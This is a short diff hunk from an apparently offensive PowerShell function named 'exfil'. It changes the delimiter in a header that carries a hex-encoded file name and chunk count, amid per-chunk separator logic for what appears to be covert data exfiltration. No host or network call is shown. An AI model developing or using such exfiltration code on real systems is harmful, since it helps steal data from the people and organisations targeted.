@@ -42,7 +42,7 @@ function exfil {
 
 			# Randomly select a separator for the total number of segments
 			$totalSeparator = 'H'
-			$hexObject | Add-Member -MemberType NoteProperty -Name 1 -Value ('-' + $chunks.Count.ToString() + $totalSeparator + $hexFileName + '-')
+			$hexObject | Add-Member -MemberType NoteProperty -Name 1 -Value ('j' + $chunks.Count.ToString() + $totalSeparator + $hexFileName + 'j')
 
 			for ($i = 0; $i -lt $chunks.Count; $i++) {
 				# Randomly select a separator from G, H, I for each chunk
